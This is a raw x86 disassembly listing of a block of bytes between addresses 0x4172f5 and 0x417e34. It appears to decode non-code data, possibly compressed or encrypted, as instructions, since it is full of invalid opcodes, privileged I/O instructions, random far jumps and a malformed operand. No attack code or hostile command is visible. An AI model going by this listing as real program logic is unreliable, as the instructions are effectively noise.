  4172f5:	sar    DWORD PTR [esp+eax*2+0x35e3fb0f],1
  4172fc:	cmp    eax,0x8b8792b9
  417301:	and    bh,BYTE PTR [esp+esi*2+0x3]
  417305:	dec    edi
  417306:	dec    eax
  417308:	arpl   WORD PTR [ecx],bx
  41730a:	(bad)  
  41730b:	xchg   edi,eax
  41730c:	clc    
  41730d:	xchg   BYTE PTR [esi+0x1344951c],dh
  417313:	xchg   ebp,eax
  417314:	push   esp
  417315:	mov    cl,0x18
  417317:	adc    ax,0x520d
  41731b:	cmc    
  41731c:	aad    0x2c
  41731e:	ins    DWORD PTR es:[edi],dx
  41731f:	push   es
  417320:	nop
  417321:	adc    BYTE PTR [edx-0x398519ba],bl
  417327:	out    0xb,eax
  417329:	add    BYTE PTR [edi+0x2b8f68eb],bh
  41732f:	dec    edx
  417330:	test   al,0x58
  417332:	add    al,0xba
  417334:	xchg   edx,eax
  417335:	and    al,0xc7
  417337:	sbb    DWORD PTR [eax],0xa
  41733a:	rol    BYTE PTR [eax+edi*4-0x91b0f5],0xee
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x2e
  4173c1:	enter  0x5cee,0x92
  4173c5:	std    
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	test   BYTE PTR [eax],0x0
  4173cb:	add    BYTE PTR [ebx],dl
  4173cd:	add    dl,BYTE PTR [edi+0x27f42af2]
  4173d3:	fstp   QWORD PTR [eax+0x6f5b909]
  4173d9:	jnp    0x417401
  4173db:	mov    dl,0x7b
  4173dd:	stos   DWORD PTR es:[edi],eax
  4173de:	pop    edx
  4173df:	dec    edi
  4173e0:	ins    DWORD PTR es:[edi],dx
  4173e1:	les    eax,FWORD PTR [esi-0x3d]
  4173e4:	jbe    0x417399
  4173e6:	mov    eax,ds:0xba1a331
  4173eb:	std    
  4173ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ed:	les    ebp,FWORD PTR [ebx+0x4e]
  4173f0:	pusha  
  4173f1:	xchg   ebx,eax
  4173f2:	je     0x417406
  4173f4:	fst    st(0)
  4173f6:	mov    esp,0xe17540b0
  4173fb:	imul   ebx,DWORD PTR ds:0xbbbe8d39,0xc74b729b
  417405:	dec    ebx
  417406:	cmp    DWORD PTR [edi],edi
  417408:	mov    esi,0x5c24a287
  41740d:	test   ax,0x583d
  417411:	es icebp 
  417413:	inc    ecx
  417414:	jne    0x417400
  417416:	in     al,dx
  417417:	xor    esp,0xffffffbc
  41741a:	retf   0xdbe8
  41741d:	add    al,0x67
  41741f:	mov    esi,0x8d6e5ac0
  417424:	bound  eax,QWORD PTR [ecx-0x3720bdf5]
  41742a:	aad    0x3d
  41742c:	add    bl,ch
  41742e:	(bad)  
  41742f:	rcr    DWORD PTR [edx+0x48],1
  417432:	xchg   ebx,eax
  417433:	and    cl,bh
  417435:	ins    BYTE PTR es:[edi],dx
  417436:	and    bl,0x62
  417439:	fs xchg ecx,eax
  41743b:	or     ebp,DWORD PTR [ecx-0x6e]
  41743e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743f:	xchg   esp,eax
  417440:	cli    
  417441:	stos   DWORD PTR es:[edi],eax
  417442:	test   BYTE PTR [si],dh
  417445:	fnstcw WORD PTR [ebp+0x3090828f]
  41744b:	lahf   
  41744c:	repnz cmp BYTE PTR [esi+edi*1+0x19],bl
  417451:	mov    dh,0x92
  417453:	loop   0x41744e
  417455:	add    al,0xf1
  417457:	cmp    BYTE PTR [edi+0x292018f9],ah
  41745d:	in     al,0x4b
  41745f:	add    eax,0x9ed36f2c
  417464:	stc    
  417465:	dec    edx
  417466:	mov    dh,0x8c
  417468:	rep outs dx,DWORD PTR ds:[esi]
  41746a:	lahf   
  41746b:	adc    DWORD PTR [ebx+0x3706f18f],0x66
  417472:	pop    es
  417473:	mov    ds:0x492c6337,al
  417478:	and    ecx,ecx
  41747a:	out    dx,al
  41747b:	(bad)
  41747e:	xor    ecx,esi
  417480:	data16 sbb al,BYTE PTR [eax-0x51]
  417484:	mov    ah,0xbb
  417486:	push   ds
  417487:	dec    ebx
  417488:	in     eax,dx
  417489:	adc    BYTE PTR [edx+0x25],0x9c
  41748d:	pop    ds
  41748e:	fs test al,0x8a
  417491:	gs push ebx
  417493:	lea    eax,[edx-0x5a]
  417496:	sbb    ebx,DWORD PTR [ecx+eax*8]
  417499:	imul   ebx,DWORD PTR [eax-0x19],0x54
  41749d:	fmul   DWORD PTR [eax-0x5b]
  4174a0:	sub    DWORD PTR [ecx+0x207211ca],edx
  4174a6:	std    
  4174a7:	sbb    eax,0x64d5be9c
  4174ac:	sub    esi,DWORD PTR [edi+0x1ecdde12]
  4174b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b3:	xchg   ax,ax
  4174b5:	loope  0x4174ed
  4174b7:	jno    0x417526
  4174b9:	xlat   BYTE PTR ds:[ebx]
  4174ba:	cld    
  4174bb:	or     bh,BYTE PTR [ebx+0x10]
  4174be:	pushf  
  4174bf:	sbb    eax,0xd600
	...
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x98243b7a
  417542:	idiv   BYTE PTR [eax+ecx*4-0x9ffff02]
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [edx+0x4b],al
  41754e:	test   eax,0xb2c8f51a
  417553:	int    0x73
  417555:	ror    BYTE PTR [edx],cl
  417557:	inc    edi
  417558:	sub    eax,0x68eb3064
  41755d:	or     al,0x43
  41755f:	outs   dx,BYTE PTR ds:[esi]
  417560:	lock add dh,BYTE PTR [ebp-0x276b837d]
  417567:	dec    ebx
  417568:	fwait
  417569:	sbb    BYTE PTR [ebx+0x3f695b36],dl
  41756f:	hlt    
  417570:	fimul  DWORD PTR [edi-0x7f]
  417573:	popa   
  417574:	mov    ds:0xc937d5cc,al
  417579:	lahf   
  41757a:	stos   DWORD PTR es:[edi],eax
  41757b:	mov    dl,BYTE PTR [eiz*2-0x6da2d998]
  417582:	xchg   edi,eax
  417583:	inc    ebp
  417584:	or     BYTE PTR [esi-0x1e],ch
  417587:	push   edi
  417588:	ja     0x4175e1
  41758a:	ins    DWORD PTR es:[edi],dx
  41758b:	scas   al,BYTE PTR es:[edi]
  41758c:	add    dh,BYTE PTR [edi]
  41758e:	pop    ds
  41758f:	shr    BYTE PTR [esi+edx*4],0xb0
  417593:	mov    al,ds:0x45aa90fd
  417598:	dec    edx
  417599:	xlat   BYTE PTR ds:[ebx]
  41759a:	cwde   
  41759b:	std    
  41759c:	mov    ds:0xe16b242f,al
  4175a1:	daa    
  4175a2:	fcomp  st(6)
  4175a4:	(bad)  
  4175a5:	repnz mov edi,0x31ce3993
  4175ab:	add    eax,0xfd93cebd
  4175b0:	std    
  4175b1:	gs enter 0x6677,0xe7
  4175b6:	das    
  4175b7:	mov    eax,0x12630129
  4175bc:	jmp    DWORD PTR [edx-0x32]
  4175bf:	mov    ebx,edx
  4175c1:	(bad)  
  4175c2:	pushf  
  4175c3:	or     dl,BYTE PTR [ecx]
  4175c5:	inc    edi
  4175c6:	scas   al,BYTE PTR es:[edi]
  4175c7:	out    0xdd,al
  4175c9:	ss sti 
  4175cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175cc:	xor    eax,0x101543d0
  4175d1:	inc    esp
  4175d2:	and    BYTE PTR [ebx],cl
  4175d4:	ja     0x4175c3
  4175d6:	adc    DWORD PTR [ecx-0x581a903],0xffffffdb
  4175dd:	(bad)  
  4175df:	or     eax,0x7e7fe061
  4175e4:	sar    BYTE PTR [esi-0x4d],1
  4175e7:	rcr    BYTE PTR [ebx-0x10],0xcb
  4175eb:	aas    
  4175ec:	cli    
  4175ed:	icebp  
  4175ee:	or     al,0xc3
  4175f0:	adc    eax,0xa582ed21
  4175f5:	das    
  4175f6:	nop    esi
  4175f9:	shr    DWORD PTR [edi],1
  4175fb:	mov    ebx,0x27347ffb
  417600:	shl    BYTE PTR [edi+0x39ea383c],1
  417606:	adc    bh,bh
  417608:	(bad)  
  417609:	jne    0x41765c
  41760b:	xor    dl,dh
  41760d:	hlt    
  41760e:	mov    ecx,0xabd11093
  417613:	dec    DWORD PTR [edx-0x4e1bdc]
  417619:	pop    eax
  41761a:	inc    ebx
  41761b:	sbb    al,0xd1
  41761d:	mov    bl,0x59
  41761f:	popf   
  417620:	and    BYTE PTR [esi],bh
  417622:	inc    DWORD PTR [edx+ecx*1]
  417625:	pushf  
  417626:	push   ds
  417627:	pop    ss
  417628:	lahf   
  417629:	neg    DWORD PTR [edi]
  41762b:	call   0xcc463d2a
  417630:	stos   BYTE PTR es:[edi],al
  417631:	dec    edi
  417632:	adc    esi,edx
  417634:	ja     0x417689
  417636:	jle    0x41761b
  417638:	out    0x25,al
  41763a:	push   ebp
  41763b:	repz xchg edi,eax
  41763d:	mov    al,ds:0x57bd926
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	pop    edi
  4176c1:	mov    cl,0x5d
  4176c3:	ja     0x417743
  4176c5:	inc    DWORD PTR [eax]
  4176c7:	add    dh,dh
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [ebp+edi*4-0x47c722d],bh
  4176d2:	jo     0x417691
  4176d4:	pop    ebx
  4176d5:	push   ds
  4176d6:	mov    bl,0x25
  4176d8:	dec    ebp
  4176d9:	jne    0x417708
  4176db:	ret    
  4176dc:	gs jmp 0x417719
  4176df:	test   edi,esi
  4176e1:	inc    eax
  4176e2:	xor    al,0x1e
  4176e4:	(bad)  
  4176e5:	and    eax,0x345587b2
  4176ea:	xor    al,0xcf
  4176ec:	(bad)  [edx-0x51]
  4176ef:	jo     0x417768
  4176f1:	arpl   ax,si
  4176f3:	adc    BYTE PTR [ecx-0x11667687],dh
  4176f9:	imul   eax,DWORD PTR [esi-0x506a63c6],0xfffffff7
  417700:	fidivr DWORD PTR [ebx+edi*1-0x31]
  417704:	add    eax,0xbc6b8c64
  417709:	inc    esi
  41770a:	xchg   esi,eax
  41770b:	inc    edi
  41770c:	jg     0x41769b
  41770e:	(bad)  
  41770f:	add    BYTE PTR [esi+0x17],dh
  417712:	pop    esi
  417713:	or     eax,0x8973f1cc
  417718:	inc    edi
  417719:	xchg   ebx,eax
  41771a:	or     edx,esi
  41771c:	dec    edi
  41771d:	push   edi
  41771e:	(bad)  
  41771f:	or     ah,dl
  417721:	jg     0x4176f5
  417723:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417725:	sub    eax,0xcffee204
  41772a:	inc    eax
  41772b:	outs   dx,DWORD PTR ds:[esi]
  41772c:	sub    al,0x86
  41772e:	push   ecx
  41772f:	(bad)  
  417731:	jg     0x4176b9
  417733:	mov    ah,0xf9
  417735:	cmp    al,0x92
  417737:	fwait
  417738:	div    DWORD PTR [ebx-0x7e]
  41773b:	mov    edi,0x1f97c8b7
  417740:	sbb    BYTE PTR [ecx-0x79],cl
  417743:	aaa    
  417744:	jne    0x41777b
  417746:	adc    BYTE PTR [edx+0x71],0xde
  41774a:	jge    0x417763
  41774c:	mov    eax,0xa00bd592
  417751:	mov    cl,0x10
  417753:	xor    cl,BYTE PTR [ebp+0x515c944a]
  417759:	gs jo  0x4177d0
  41775c:	push   es
  41775d:	push   ebp
  41775e:	push   ds
  41775f:	xchg   DWORD PTR [ebp+0x721f4834],edx
  417765:	push   esp
  417766:	pop    ebx
  417767:	fpatan 
  417769:	std    
  41776a:	jmp    0x6c604f17
  41776f:	jnp    0x417799
  417771:	pop    ss
  417772:	aaa    
  417773:	test   ch,dl
  417775:	cli    
  417776:	inc    esi
  417777:	push   cs
  417778:	sbb    dh,ch
  41777a:	xchg   esi,eax
  41777b:	loope  0x4177e9
  41777d:	inc    edi
  41777e:	xor    DWORD PTR [ebp-0x8005aa8],esp
  417784:	lds    ebx,FWORD PTR [edx]
  417786:	in     eax,0x90
  417788:	popf   
  417789:	int    0x1f
  41778b:	sbb    edx,DWORD PTR [ebx]
  41778d:	jp     0x4177e4
  41778f:	mov    bl,0xd5
  417791:	push   0x437abc15
  417796:	int    0x84
  417798:	sub    esi,esi
  41779a:	xchg   edi,eax
  41779b:	ja     0x41780b
  41779d:	push   es
  41779e:	popf   
  41779f:	push   esp
  4177a0:	add    DWORD PTR [esi],edx
  4177a2:	mov    esi,0xb33f14e
  4177a7:	bound  ebp,QWORD PTR [ebx+ebx*2-0x28]
  4177ab:	cmc    
  4177ac:	stos   DWORD PTR es:[edi],eax
  4177ad:	jne    0x417795
  4177af:	mov    ?,WORD PTR [edi-0x883ad46]
  4177b5:	rol    ch,cl
  4177b7:	mov    ds:0x5ab30a97,al
  4177bc:	lds    esp,FWORD PTR [esi+ebp*2+0x3f]
  4177c0:	pop    eax
  4177c1:	add    BYTE PTR [eax],0x0
	...
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x457d6e99
  417841:	or     eax,0x74d429
  417846:	add    DWORD PTR [eax],eax
  417848:	test   BYTE PTR [eax],0x0
  41784b:	add    BYTE PTR [ebp-0x14],bl
  41784e:	xor    BYTE PTR [ecx],0xd1
  417851:	cmp    ebx,DWORD PTR [ebp-0x6b7d6e31]
  417857:	mov    esi,0x8b7f4e73
  41785c:	gs push cs
  41785e:	adc    ecx,DWORD PTR [eax+0x4b9e1b61]
  417864:	fcmove st,st(5)
  417866:	mov    ebp,0xad033df1
  41786b:	pushw  ds
  41786d:	add    DWORD PTR [eax+0xa1586c4],ebp
  417873:	imul   ebx,DWORD PTR [esi-0x41],0xffffffe2
  417877:	push   edx
  417878:	daa    
  417879:	mov    cl,0x4f
  41787b:	loopne 0x417868
  41787d:	pusha  
  41787e:	push   0xffffff8c
  417880:	stos   BYTE PTR es:[edi],al
  417881:	pop    es
  417882:	mov    edi,0xa2078976
  417887:	aam    0x24
  417889:	jb     0x417843
  41788b:	pushf  
  41788c:	fst    QWORD PTR [eax]
  41788e:	stos   DWORD PTR es:[edi],eax
  41788f:	jmp    0x595a:0x8ed4ebf4
  417896:	cmp    ebx,edi
  417898:	dec    esp
  417899:	push   ds
  41789a:	(bad)  
  41789b:	push   ebp
  41789c:	adc    eax,0x9c81d026
  4178a1:	xor    eax,0xad495b8b
  4178a6:	(bad)  
  4178a7:	cmc    
  4178a8:	pop    esi
  4178a9:	mov    ebx,0xa549eaba
  4178ae:	fucomi st,st(3)
  4178b0:	ins    BYTE PTR es:[edi],dx
  4178b1:	inc    edi
  4178b2:	ins    DWORD PTR es:[edi],dx
  4178b3:	popf   
  4178b4:	in     eax,0xc2
  4178b6:	pop    ds
  4178b7:	(bad)  
  4178b8:	ins    BYTE PTR es:[edi],dx
  4178b9:	stc    
  4178ba:	push   ebx
  4178bb:	mov    edx,edx
  4178bd:	mov    ecx,eax
  4178bf:	or     BYTE PTR [esi+0x2d36e253],ch
  4178c5:	and    eax,0x4789aed1
  4178ca:	test   eax,0x59ef7df9
  4178cf:	jg     0x417866
  4178d1:	mov    DWORD PTR [edi+0x42],edi
  4178d4:	test   eax,0x9e7900cb
  4178d9:	sub    eax,ebx
  4178db:	lock push ecx
  4178dd:	xor    eax,0x23727186
  4178e2:	pop    ds
  4178e3:	add    BYTE PTR [eax],dh
  4178e5:	cli    
  4178e6:	fsubr  QWORD PTR [ebp+0x16d1bcb3]
  4178ec:	pop    ebx
  4178ed:	rcl    DWORD PTR [eax+0x70427aea],1
  4178f3:	gs xchg edx,eax
  4178f5:	xchg   esi,eax
  4178f6:	xchg   ebx,eax
  4178f7:	or     eax,0x67663647
  4178fc:	mov    al,cl
  4178fe:	lods   al,BYTE PTR ds:[esi]
  4178ff:	ja     0x417932
  417901:	(bad)  
  417902:	int3   
  417903:	out    dx,al
  417904:	mov    bh,0x9a
  417906:	retf   
  417907:	popf   
  417908:	cld    
  417909:	call   0xe536:0x2c22dda4
  417910:	dec    esi
  417911:	jmp    ebx
  417913:	and    edx,esp
  417915:	mov    bl,0x41
  417917:	jbe    0x41791e
  417919:	(bad)  
  41791a:	in     eax,dx
  41791b:	mov    bl,0xa7
  41791d:	test   eax,0x80fa4eb5
  417922:	aam    0x12
  417924:	mov    esi,0x73d30031
  417929:	mov    ch,0xed
  41792b:	fst    QWORD PTR [ecx+0x1f09f24d]
  417931:	sub    al,0x10
  417933:	xchg   ebp,eax
  417934:	fstp   TBYTE PTR [edi+0x75]
  417937:	fdiv   QWORD PTR [edi+0x35]
  41793a:	test   al,0x20
  41793c:	mov    al,0x10
  41793e:	add    edi,edx
  417940:	jg     0x4178d3
	...
  4179b2:	add    BYTE PTR [eax],al
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi-0x52343680]
  4179c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179c3:	jb     0x417a2f
  4179c5:	add    DWORD PTR [ecx],eax
  4179c7:	add    dh,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    cl,dl
  4179cd:	pop    esi
  4179ce:	sub    DWORD PTR [esp+ecx*4+0x4d],ebp
  4179d2:	sub    DWORD PTR [ecx+0x7b],ecx
  4179d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179d6:	rcl    BYTE PTR [edx-0x54124c27],0xd9
  4179dd:	enter  0x1dd0,0xab
  4179e1:	jo     0x4179e3
  4179e3:	popa   
  4179e4:	push   edx
  4179e5:	xchg   BYTE PTR [edx+esi*4-0x4f],bh
  4179e9:	or     al,0x95
  4179eb:	sub    BYTE PTR [ebx-0x1037a818],bl
  4179f1:	dec    eax
  4179f2:	pop    esi
  4179f3:	sub    eax,DWORD PTR [edx-0x55]
  4179f6:	sbb    al,0x56
  4179f8:	retf   0xa0a6
  4179fb:	adc    al,bl
  4179fd:	pop    esi
  4179fe:	mov    esp,0x6f25290c
  417a03:	stc    
  417a04:	push   0xffffff84
  417a06:	(bad)  
  417a07:	sub    BYTE PTR ss:[edi-0x3b],dh
  417a0b:	adc    ebp,esi
  417a0d:	or     eax,0x919157ba
  417a12:	retf   
  417a13:	gs out 0x3f,al
  417a16:	fwait
  417a17:	(bad)  
  417a18:	and    dh,bh
  417a1a:	fstp   TBYTE PTR [ecx]
  417a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a1d:	mov    esp,0x900c6a2f
  417a22:	mov    ah,0xba
  417a24:	or     BYTE PTR [edi],dl
  417a26:	inc    ebp
  417a27:	xchg   esi,eax
  417a28:	lods   eax,DWORD PTR ds:[esi]
  417a29:	inc    esp
  417a2a:	fcmovnu st,st(7)
  417a2c:	push   ebp
  417a2d:	inc    edx
  417a2e:	fisub  DWORD PTR [ecx+0x56]
  417a31:	loope  0x417a27
  417a33:	outs   dx,BYTE PTR ds:[esi]
  417a34:	dec    edx
  417a35:	out    0x6a,eax
  417a37:	mov    cs,ebx
  417a39:	or     esi,DWORD PTR es:[ebp+eax*8-0x3b3448e6]
  417a41:	push   ebx
  417a42:	iret   
  417a43:	in     al,0x4c
  417a45:	das    
  417a46:	xor    BYTE PTR [ebx],cl
  417a48:	and    edx,ecx
  417a4a:	int3   
  417a4b:	outs   dx,DWORD PTR ds:[esi]
  417a4c:	icebp  
  417a4d:	dec    edx
  417a4e:	in     al,dx
  417a4f:	imul   esi,DWORD PTR [ebp+ecx*2+0x32],0xb796e8a6
  417a57:	adc    BYTE PTR [eax-0x63],0xd9
  417a5b:	les    esi,FWORD PTR [esp+ecx*8-0xb8ddcf6]
  417a62:	adc    eax,0xc5c55e0e
  417a67:	jnp    0x417ac6
  417a69:	and    DWORD PTR [edi+0x14],0xecc504c8
  417a70:	and    ebp,DWORD PTR [ebx]
  417a72:	mov    eax,ds:0xc4089f3
  417a77:	shl    BYTE PTR [eax+esi*8+0x36],0x8
  417a7c:	dec    edx
  417a7d:	test   BYTE PTR [eax],dh
  417a7f:	sbb    BYTE PTR [edx-0x1685a115],ch
  417a85:	pop    ds
  417a86:	out    dx,al
  417a87:	push   ebx
  417a88:	ja     0x417ae6
  417a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8b:	test   eax,0x7588c91
  417a90:	sub    al,0x1b
  417a92:	and    ebp,DWORD PTR [esi-0x1c]
  417a95:	sbb    eax,0xaa3fbd31
  417a9a:	adc    esi,edi
  417a9c:	inc    ebp
  417a9d:	inc    bx
  417a9f:	mov    gs,WORD PTR [ebp-0xf]
  417aa2:	rol    BYTE PTR [edi],1
  417aa4:	ret    0x70fe
  417aa7:	sahf   
  417aa8:	shr    DWORD PTR [eax-0xafd08be],cl
  417aae:	pop    ds
  417aaf:	mov    al,0x30
  417ab1:	push   esi
  417ab2:	jae    0x417a7d
  417ab4:	rol    DWORD PTR gs:[esi+0x227cb765],1
  417abb:	fiadd  DWORD PTR [esi+0x58]
  417abe:	sbb    dh,ch
  417ac0:	mov    eax,ds:0x3
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xf9fef5f7
  417b41:	leave  
  417b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b43:	or     al,0x60
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    dh,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR [ecx+edx*1],dh
  417b4e:	out    dx,al
  417b4f:	mov    cl,0xd0
  417b51:	or     BYTE PTR [edi-0x62],ch
  417b54:	lea    ebp,[esi-0x3460ba4b]
  417b5a:	inc    eax
  417b5b:	(bad)  
  417b5c:	cmc    
  417b5d:	mov    edx,DWORD PTR [ebx+0x8]
  417b60:	xlat   BYTE PTR ds:[ebx]
  417b61:	clc    
  417b62:	mov    ds:0x6804af9b,eax
  417b67:	aaa    
  417b68:	adc    ch,BYTE PTR [esi+0x155b7ac3]
  417b6e:	lods   al,BYTE PTR ds:[esi]
  417b6f:	popa   
  417b70:	pop    ebx
  417b71:	mov    ebx,0x21e6fa59
  417b76:	adc    cl,bl
  417b78:	sbb    al,0x63
  417b7a:	inc    esi
  417b7b:	das    
  417b7c:	xor    eax,0xcc24d54a
  417b81:	sbb    BYTE PTR [edi],ah
  417b83:	xor    al,0x9f
  417b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b86:	or     al,BYTE PTR [edi+0x59]
  417b89:	cli    
  417b8a:	jp     0x417ba8
  417b8c:	xor    BYTE PTR [ebx-0x3],bl
  417b8f:	in     al,dx
  417b90:	cmc    
  417b91:	push   edi
  417b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b93:	mov    ds:0x848c4e2,al
  417b98:	or     al,0x2b
  417b9a:	mov    cl,0x4b
  417b9c:	ja     0x417b8e
  417b9e:	push   cs
  417b9f:	aas    
  417ba0:	scas   al,BYTE PTR es:[edi]
  417ba1:	mov    fs,WORD PTR [ecx]
  417ba3:	cmc    
  417ba4:	jmp    0x417be5
  417ba6:	inc    edx
  417ba7:	vandps xmm2,xmm5,XMMWORD PTR [edi]
  417bab:	shr    BYTE PTR [edx-0x67ec0f89],0x98
  417bb2:	jne    0x417b76
  417bb4:	call   0xd848:0x1230b8be
  417bbb:	push   esp
  417bbc:	adc    eax,0xbdf91d65
  417bc1:	and    ch,dh
  417bc3:	xor    eax,0xfd9cbff0
  417bc8:	sbb    ecx,0x5c
  417bcb:	xchg   esi,eax
  417bcc:	(bad)  
  417bcd:	xor    al,0x49
  417bcf:	daa    
  417bd0:	adc    al,0xc6
  417bd2:	fcom   DWORD PTR [edx]
  417bd4:	das    
  417bd5:	retf   
  417bd6:	ret    
  417bd7:	cmp    edx,esp
  417bd9:	xchg   edx,eax
  417bda:	dec    edx
  417bdb:	push   ebp
  417bdc:	arpl   WORD PTR [edx+0x20],di
  417bdf:	ret    0xbc32
  417be2:	nop
  417be3:	int3   
  417be4:	xchg   esi,eax
  417be5:	outs   dx,BYTE PTR ds:[esi]
  417be6:	adc    bh,al
  417be8:	fstp   QWORD PTR [ebp+0x45d3b127]
  417bee:	jo     0x417bd8
  417bf0:	scas   al,BYTE PTR es:[edi]
  417bf1:	mov    esp,0x82b7457f
  417bf6:	xchg   BYTE PTR [edx+0x195fd91c],bh
  417bfc:	ret    0x7cfa
  417bff:	int    0x55
  417c01:	lock pop esp
  417c03:	call   0x3b270c4a
  417c08:	test   eax,0xb867f6e1
  417c0d:	mov    dh,BYTE PTR [esi-0x6eb3a761]
  417c13:	jp     0x417bdd
  417c15:	mov    esp,0x380893b7
  417c1a:	ins    DWORD PTR es:[edi],dx
  417c1b:	out    0x2d,eax
  417c1d:	jl     0x417c85
  417c1f:	loope  0x417c9e
  417c21:	adc    BYTE PTR [eax+0x5ea7b483],bl
  417c27:	les    esi,FWORD PTR ds:0xe38e84a8
  417c2d:	inc    esp
  417c2e:	xchg   DWORD PTR ds:0x8f5c6930,ebp
  417c34:	out    0xd3,al
  417c36:	sub    DWORD PTR [esi],ebp
  417c38:	push   es
  417c39:	mov    edi,0x26886020
  417c3e:	xchg   BYTE PTR [ebp-0x22],bh
  417c41:	jmp    0x417c46
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [ebp+0x56a2a8ca],ebx
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    dh,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    bh,dl
  417ccd:	jae    0x417c6e
  417ccf:	std    
  417cd0:	mov    BYTE PTR [ecx+ecx*8+0x26],cl
  417cd4:	lock and eax,0x5ef62f7f
  417cda:	test   eax,0x3f8b2903
  417cdf:	dec    eax
  417ce0:	lahf   
  417ce1:	mov    eax,ds:0x9d731830
  417ce6:	in     al,0xde
  417ce8:	cmovg  esp,DWORD PTR [ebx+eiz*4-0x19]
  417ced:	iret   
  417cee:	and    dl,cl
  417cf0:	fistp  WORD PTR [esi]
  417cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf3:	jp     0x417cd7
  417cf5:	sbb    al,0x13
  417cf7:	add    DWORD PTR [esi-0xe819bd8],edx
  417cfd:	fsub   QWORD PTR [ebp+0x7b]
  417d00:	in     al,dx
  417d01:	imul   edx,DWORD PTR [eax+0x51],0x834fba9
  417d08:	jl     0x417cdc
  417d0a:	aaa    
  417d0b:	xor    eax,0x3d3c7455
  417d10:	dec    esp
  417d11:	jmp    0x4243:0x50c49d7a
  417d18:	bound  ebx,QWORD PTR [esi-0x2e]
  417d1b:	jmp    0x417d4c
  417d1d:	call   esi
  417d1f:	js     0x417d39
  417d21:	mov    eax,0x5a91d8c4
  417d26:	dec    esi
  417d27:	iret   
  417d28:	adc    eax,DWORD PTR [ebp+0x70]
  417d2b:	(bad)  
  417d2c:	sub    BYTE PTR [esi],bl
  417d2e:	cmp    edi,DWORD PTR ds:0x395cdcc1
  417d34:	arpl   WORD PTR [ecx*1+0x6a11b9b4],di
  417d3b:	nop
  417d3c:	test   al,0x7d
  417d3e:	(bad)  
  417d3f:	call   0xbe15:0xea8fc3ec
  417d46:	(bad)  
  417d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d48:	sbb    al,0xb9
  417d4a:	inc    eax
  417d4b:	adc    al,BYTE PTR [eax+0x6a]
  417d4e:	push   ebx
  417d4f:	sub    eax,0x7d652756
  417d54:	leave  
  417d55:	cmp    al,0xf3
  417d57:	xor    DWORD PTR [ecx],0xffffff96
  417d5a:	call   0xa03d:0xa8e6f45e
  417d61:	or     bl,al
  417d63:	(bad)  
  417d65:	cmp    dl,BYTE PTR [edx]
  417d67:	int3   
  417d68:	fcmovnbe st,st(6)
  417d6a:	daa    
  417d6b:	out    0x8f,eax
  417d6d:	push   edi
  417d6e:	adc    ch,0x78
  417d71:	mov    ecx,0x1f1c0f27
  417d76:	jnp    0x417d64
  417d78:	call   0xfc7580a8
  417d7d:	and    eax,0xee70ffcb
  417d82:	xor    al,0x89
  417d84:	mov    dl,0xb4
  417d86:	scas   eax,DWORD PTR es:[edi]
  417d87:	sbb    ah,al
  417d89:	js     0x417dbb
  417d8b:	xchg   esi,eax
  417d8c:	or     al,0x63
  417d8e:	ins    BYTE PTR es:[edi],dx
  417d8f:	into   
  417d90:	xlat   BYTE PTR ds:[ebx]
  417d91:	add    ah,BYTE PTR es:[edi+0x4b]
  417d95:	sub    eax,0x6f4174a2
  417d9a:	push   0xfffffff4
  417d9c:	pop    es
  417d9d:	mov    bh,0xcd
  417d9f:	xchg   edi,eax
  417da0:	cmp    eax,0x2c492f85
  417da5:	push   es
  417da6:	cmc    
  417da7:	push   0x7
  417da9:	jnp    0x417e18
  417dab:	inc    esi
  417dac:	mov    esi,0xe32324b1
  417db1:	xor    ecx,DWORD PTR [ecx]
  417db3:	pop    eax
  417db4:	sub    eax,0x784142a5
  417db9:	out    0x48,eax
  417dbb:	bound  ebp,QWORD PTR [edx+0x289dc1aa]
  417dc1:	pop    edx
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	mov    edi,0xae6d8e19
